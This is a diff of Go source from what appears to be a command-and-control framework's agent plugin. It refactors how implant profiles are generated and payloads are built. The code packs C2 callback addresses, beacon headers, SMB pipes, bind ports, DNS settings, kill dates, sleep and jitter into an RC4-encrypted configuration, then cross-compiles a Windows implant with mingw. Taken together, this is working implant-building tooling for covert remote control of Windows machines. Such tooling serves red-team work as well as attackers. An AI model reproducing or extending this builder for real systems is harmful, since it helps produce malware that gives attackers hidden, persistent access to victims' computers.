@@ -269,190 +269,196 @@ var (
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
 
-func (p *PluginAgent) GenerateConfig(config string, listenerWM string, listenerProfile []byte) ([]byte, error) {
-	var (
-		listenerMap   map[string]any
-		payloadConfig []byte
-	)
+func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
+	var agentProfiles [][]byte
 
-	if err := json.Unmarshal(listenerProfile, &listenerMap); err != nil {
-		return nil, err
+	for _, transportProfile := range profile.ListenerProfiles {
+
+		var listenerMap map[string]any
+		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
+			return nil, err
+		}
+
+		/// START CODE HERE
+
+		var (
+			generateConfig GenerateConfig
+			params         []interface{}
+		)
+
+		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
+		if err != nil {
+			return nil, err
+		}
+
+		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
+		if err != nil {
+			return nil, err
+		}
+
+		kill_date := 0
+		if generateConfig.IsKillDate {
+			dt := generateConfig.Killdate + " " + generateConfig.Killtime
+			t, err := time.Parse("02.01.2006 15:04:05", dt)
+			if err != nil {
+				err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
+				return nil, err
+			}
+			kill_date = int(t.Unix())
+		}
+
+		working_time := 0
+		if generateConfig.IsWorkingTime {
+			t := generateConfig.StartTime + "-" + generateConfig.EndTime
+			working_time, err = parseStringToWorkingTime(t)
+			if err != nil {
+				return nil, err
+			}
+		}
+
+		encrypt_key, _ := listenerMap["encrypt_key"].(string)
+		encryptKey, err := hex.DecodeString(encrypt_key)
+		if err != nil {
+			return nil, err
+		}
+
+		protocol, _ := listenerMap["protocol"].(string)
+		switch protocol {
+
+		case "http":
+
+			var Hosts []string
+			var Ports []int
+			hosts_agent, _ := listenerMap["callback_addresses"].(string)
+			lines := strings.Split(strings.TrimSpace(hosts_agent), ", ")
+			for _, line := range lines {
+				line = strings.TrimSpace(line)
+				if line == "" {
+					continue
+				}
+
+				host, portStr, _ := net.SplitHostPort(line)
+				port, _ := strconv.Atoi(portStr)
+
+				Hosts = append(Hosts, host)
+				Ports = append(Ports, port)
+			}
+			c2Count := len(Hosts)
+
+			HttpMethod, _ := listenerMap["http_method"].(string)
+			Ssl, _ := listenerMap["ssl"].(bool)
+			Uri, _ := listenerMap["uri"].(string)
+			ParameterName, _ := listenerMap["hb_header"].(string)
+			UserAgent, _ := listenerMap["user_agent"].(string)
+			RequestHeaders, _ := listenerMap["request_headers"].(string)
+
+			WebPageOutput, _ := listenerMap["page-payload"].(string)
+			ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
+			ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
+
+			seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+			if err != nil {
+				return nil, err
+			}
+
+			params = append(params, int(agentWatermark))
+			params = append(params, Ssl)
+			params = append(params, c2Count)
+			for i := 0; i < c2Count; i++ {
+				params = append(params, Hosts[i])
+				params = append(params, Ports[i])
+			}
+			params = append(params, HttpMethod)
+			params = append(params, Uri)
+			params = append(params, ParameterName)
+			params = append(params, UserAgent)
+			params = append(params, RequestHeaders)
+			params = append(params, ansOffset1)
+			params = append(params, ansOffset2)
+			params = append(params, kill_date)
+			params = append(params, working_time)
+			params = append(params, seconds)
+			params = append(params, generateConfig.Jitter)
+
+		case "bind_smb":
+
+			pipename, _ := listenerMap["pipename"].(string)
+			pipename = "\\\\.\\pipe\\" + pipename
+
+			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
+
+			params = append(params, int(agentWatermark))
+			params = append(params, pipename)
+			params = append(params, int(lWatermark))
+			params = append(params, kill_date)
+
+		case "bind_tcp":
+			prepend, _ := listenerMap["prepend_data"].(string)
+			port, _ := listenerMap["port_bind"].(float64)
+
+			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
+
+			params = append(params, int(agentWatermark))
+			params = append(params, prepend)
+			params = append(params, int(port))
+			params = append(params, int(lWatermark))
+			params = append(params, kill_date)
+
+		case "dns":
+			params, err = buildDNSProfileParams(generateConfig, listenerMap, transportProfile.Watermark, agentWatermark, kill_date, working_time)
+			if err != nil {
+				return nil, err
+			}
+
+		default:
+			return nil, errors.New("protocol unknown")
+		}
+
+		packedParams, err := PackArray(params)
+		if err != nil {
+			return nil, err
+		}
+
+		cryptParams, err := RC4Crypt(packedParams, encryptKey)
+		if err != nil {
+			return nil, err
+		}
+
+		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
+		packedProfile, err := PackArray(profileArray)
+		if err != nil {
+			return nil, err
+		}
+
+		profileString := ""
+		for _, b := range packedProfile {
+			profileString += fmt.Sprintf("\\x%02x", b)
+		}
+		agentProfiles = append(agentProfiles, []byte(profileString))
+
+		/// END CODE HERE
 	}
+	return agentProfiles, nil
+}
+
+func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
+	var (
+		Filename string
+		Payload  []byte
+	)
 
 	/// START CODE HERE
 
-	var (
-		generateConfig GenerateConfig
-		params         []interface{}
-	)
-
-	err := json.Unmarshal([]byte(config), &generateConfig)
-	if err != nil {
-		return nil, err
+	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
+		return nil, "", errors.New("only one listener profile is supported")
 	}
+	listenerProfile := profile.ListenerProfiles[0].Profile
+	agentProfile := agentProfiles[0]
 
-	agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
-	if err != nil {
-		return nil, err
-	}
-
-	kill_date := 0
-	if generateConfig.IsKillDate {
-		dt := generateConfig.Killdate + " " + generateConfig.Killtime
-		t, err := time.Parse("02.01.2006 15:04:05", dt)
-		if err != nil {
-			err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
-			return nil, err
-		}
-		kill_date = int(t.Unix())
-	}
-
-	working_time := 0
-	if generateConfig.IsWorkingTime {
-		t := generateConfig.StartTime + "-" + generateConfig.EndTime
-		working_time, err = parseStringToWorkingTime(t)
-		if err != nil {
-			return nil, err
-		}
-	}
-
-	encrypt_key, _ := listenerMap["encrypt_key"].(string)
-	encryptKey, err := hex.DecodeString(encrypt_key)
-	if err != nil {
-		return nil, err
-	}
-
-	protocol, _ := listenerMap["protocol"].(string)
-	switch protocol {
-
-	case "http":
-
-		var Hosts []string
-		var Ports []int
-		hosts_agent, _ := listenerMap["callback_addresses"].(string)
-		lines := strings.Split(strings.TrimSpace(hosts_agent), ", ")
-		for _, line := range lines {
-			line = strings.TrimSpace(line)
-			if line == "" {
-				continue
-			}
-
-			host, portStr, _ := net.SplitHostPort(line)
-			port, _ := strconv.Atoi(portStr)
-
-			Hosts = append(Hosts, host)
-			Ports = append(Ports, port)
-		}
-		c2Count := len(Hosts)
-
-		HttpMethod, _ := listenerMap["http_method"].(string)
-		Ssl, _ := listenerMap["ssl"].(bool)
-		Uri, _ := listenerMap["uri"].(string)
-		ParameterName, _ := listenerMap["hb_header"].(string)
-		UserAgent, _ := listenerMap["user_agent"].(string)
-		RequestHeaders, _ := listenerMap["request_headers"].(string)
-
-		WebPageOutput, _ := listenerMap["page-payload"].(string)
-		ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
-		ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
-
-		seconds, err := parseDurationToSeconds(generateConfig.Sleep)
-		if err != nil {
-			return nil, err
-		}
-
-		params = append(params, int(agentWatermark))
-		params = append(params, Ssl)
-		params = append(params, c2Count)
-		for i := 0; i < c2Count; i++ {
-			params = append(params, Hosts[i])
-			params = append(params, Ports[i])
-		}
-		params = append(params, HttpMethod)
-		params = append(params, Uri)
-		params = append(params, ParameterName)
-		params = append(params, UserAgent)
-		params = append(params, RequestHeaders)
-		params = append(params, ansOffset1)
-		params = append(params, ansOffset2)
-		params = append(params, kill_date)
-		params = append(params, working_time)
-		params = append(params, seconds)
-		params = append(params, generateConfig.Jitter)
-
-	case "bind_smb":
-
-		pipename, _ := listenerMap["pipename"].(string)
-		pipename = "\\\\.\\pipe\\" + pipename
-
-		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
-
-		params = append(params, int(agentWatermark))
-		params = append(params, pipename)
-		params = append(params, int(lWatermark))
-		params = append(params, kill_date)
-
-	case "bind_tcp":
-		prepend, _ := listenerMap["prepend_data"].(string)
-		port, _ := listenerMap["port_bind"].(float64)
-
-		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
-
-		params = append(params, int(agentWatermark))
-		params = append(params, prepend)
-		params = append(params, int(port))
-		params = append(params, int(lWatermark))
-		params = append(params, kill_date)
-
-	case "dns":
-		params, err = buildDNSProfileParams(generateConfig, listenerMap, listenerWM, agentWatermark, kill_date, working_time)
-		if err != nil {
-			return nil, err
-		}
-
-	default:
-		return nil, errors.New("protocol unknown")
-	}
-
-	packedParams, err := PackArray(params)
-	if err != nil {
-		return nil, err
-	}
-
-	cryptParams, err := RC4Crypt(packedParams, encryptKey)
-	if err != nil {
-		return nil, err
-	}
-
-	profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
-	packedProfile, err := PackArray(profileArray)
-	if err != nil {
-		return nil, err
-	}
-
-	profileString := ""
-	for _, b := range packedProfile {
-		profileString += fmt.Sprintf("\\x%02x", b)
-	}
-	payloadConfig = []byte(profileString)
-
-	/// END CODE HERE
-
-	return payloadConfig, nil
-}
-
-func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, listenerProfile []byte, builderId string) ([]byte, string, error) {
-	var (
-		listenerMap map[string]any
-		Filename    string
-		Payload     []byte
-	)
-
+	var listenerMap map[string]any
 	if err := json.Unmarshal(listenerProfile, &listenerMap); err != nil {
 		return nil, "", err
 	}
-
-	/// START CODE HERE
 
 	var (
 		generateConfig GenerateConfig
@@ -468,7 +474,7 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 	cFlags := CFlags
 	lFlags := LFlags
 
-	err := json.Unmarshal([]byte(agentConfig), &generateConfig)
+	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
 	if err != nil {
 		return nil, "", err
 	}
@@ -495,7 +501,7 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
-	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: %s", protocol, ConnectorFile))
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: %s", protocol, ConnectorFile))
 
 	if generateConfig.Arch == "x86" {
 		Compiler = "i686-w64-mingw32-g++"
@@ -520,16 +526,16 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 	} else {
 		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, cFlags, ObjectDir, string(agentProfile), agentProfileSize, tempDir)
 	}
-	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, "Compiling configuration...")
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling configuration...")
 
 	var buildArgsConfig []string
 	buildArgsConfig = append(buildArgsConfig, "-c", cmdConfig)
-	err = Ts.TsAgentBuildExecute(builderId, currentDir, "sh", buildArgsConfig...)
+	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", buildArgsConfig...)
 	if err != nil {
 		_ = os.RemoveAll(tempDir)
 		return nil, "", err
 	}
-	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")
 
 	Files := tempDir + "/config.o "
 	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
@@ -573,15 +579,15 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 		_ = os.RemoveAll(tempDir)
 		return nil, "", errors.New("unknown file format")
 	}
-	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))
-	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, "Linking payload...")
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")
 
 	var buildArgs []string
 	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
 	buildArgs = append(buildArgs, strings.Fields(Files)...)
 	buildArgs = append(buildArgs, "-o", buildPath)
 
-	err = Ts.TsAgentBuildExecute(builderId, currentDir, Compiler, buildArgs...)
+	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
 	if err != nil {
 		_ = os.RemoveAll(tempDir)
 		return nil, "", err
@@ -602,7 +608,7 @@ func (p *PluginAgent) BuildPayload(agentConfig string, agentProfile []byte, list
 	} else {
 		Payload = buildContent
 	}
-	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))
 
 	/// END CODE HERE
 
